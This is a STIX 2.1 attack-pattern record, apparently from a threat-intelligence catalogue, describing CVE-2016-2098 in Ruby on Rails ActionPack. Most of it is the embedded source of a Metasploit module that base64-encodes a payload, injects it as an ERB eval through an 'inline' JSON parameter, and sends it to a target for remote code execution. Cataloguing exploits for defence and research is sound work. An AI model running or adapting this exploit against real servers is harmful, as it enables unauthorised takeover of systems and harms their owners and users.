{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--77e97b4a-8936-4d39-961a-11ff5cbd58ba",
    "created": "2024-08-14T17:11:46.448612Z",
    "modified": "2024-08-14T17:11:46.448615Z",
    "name": "Ruby on Rails ActionPack Inline ERB Code Execution",
    "description": " This module exploits a remote code execution vulnerability in the inline request processor of the Ruby on Rails ActionPack component. This vulnerability allows an attacker to process ERB to the inline JSON processor, which is then rendered, permitting full RCE within the runtime, without logging an error condition. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/rails_actionpack_inline_exec.rb",
            "external_id": "rails_actionpack_inline_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2098"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Ruby on Rails ActionPack Inline ERB Code Execution',\n      'Description'    => %q{\n          This module exploits a remote code execution vulnerability in the\n        inline request processor of the Ruby on Rails ActionPack component.\n        This vulnerability allows an attacker to process ERB to the inline\n        JSON processor, which is then rendered, permitting full RCE within\n        the runtime, without logging an error condition.\n      },\n      'Author'         =>\n        [\n          'RageLtMan <rageltman[at]sempervictus>'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2016-2098' ]\n        ],\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Privileged'     => false,\n      'Targets'        =>\t[ ['Automatic', {} ] ],\n      'DisclosureDate' => '2016-03-01',\n      'DefaultOptions' => {\n        \"PrependFork\" => true\n      },\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('TARGETURI', [ true, 'The path to a vulnerable Ruby on Rails application', \"/\"]),\n        OptString.new('TARGETPARAM', [ true, 'The target parameter to inject with inline code', 'id'])\n      ])\n\n  end\n\n  def json_request\n    code = Rex::Text.encode_base64(payload.encoded)\n    return {\n      datastore['TARGETPARAM'] => {\"inline\" => \"<%= eval(%[#{code}].unpack(%[m0])[0]) %>\"}\n    }.to_json\n  end\n\n  def exploit\n    print_status(\"Sending inline code to parameter: #{datastore['TARGETPARAM']}\")\n    send_request_cgi({\n      'uri'     => normalize_uri(target_uri.path),\n      'method'  => 'GET',\n      'ctype'   => 'application/json',\n      'headers' => {\n        'Accept' => 'application/json'\n      },\n      'data'    => json_request\n    }, 25)\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-01",
    "x_mitre_platforms": [
        "ruby'"
    ]
}